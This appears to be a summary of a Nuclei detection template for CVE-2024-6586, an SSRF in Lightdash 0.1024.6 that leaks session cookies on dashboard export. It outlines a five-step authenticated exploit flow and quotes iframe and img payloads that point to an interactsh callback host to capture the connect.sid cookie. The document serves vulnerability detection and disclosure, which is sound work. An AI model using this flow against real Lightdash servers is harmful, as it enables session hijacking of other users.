---
cve_id: CVE-2024-6586
template_path: nuclei-templates/http/cves/2024/CVE-2024-6586.yaml
affected_product: Lightdash
severity: high
authentication: required
external_callback: true
affected_versions: 0.1024.6
preconditions: []
poc_classification: info-leak
---

## Vulnerability

Server-Side Request Forgery (SSRF) in the export dashboard functionality of Lightdash version 0.1024.6 allows remote authenticated threat actors to obtain the session cookie of any user who exports a crafted dashboard. Dashboards containing HTML elements trigger server-side HTTP requests to an external domain that embed the exporting userâ€™s `connect.sid` cookie, enabling session hijacking. 

**Impact:** Authenticated attackers craft malicious markdown tiles (iframe/img) that exfiltrate session cookies on export.  
**CVSS:** 7.3 (CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:U/C:H/I:H/A:N)  
**CWE:** CWE-201  
**Remediation:** Update to version 0.1024.7 or later.

## PoC / Detection

Classification: info-leak

The template executes a 5-step authenticated workflow (flow: http(1) && http(2) && http(3) && http(4) && http(5)) that fully reproduces the exploitation path to verify the SSRF:  
1. POST /api/v1/login with supplied username/password to obtain session.  
2. GET /api/v1/org/projects and extracts first projectUuid.  
3. POST /api/v1/projects/{projectuuid}/dashboards to create a blank dashboard and extracts dashUuid.  
4. PATCH /api/v1/dashboards/{dashuuid} to insert a markdown tile with `<iframe src="http://{{interactsh-url}}">` and `<img src="http://{{interactsh-url}}">`.  
5. POST /api/v1/dashboards/{dashuuid}/export and matches on interactsh OOB callback containing `interactsh_protocol: http`, `connect.sid=` in the request, and successful export status.

## References

- https://github.com/google/security-research/security/advisories/GHSA-4h7x-6vxh-7hjf
- https://nvd.nist.gov/vuln/detail/CVE-2024-6586
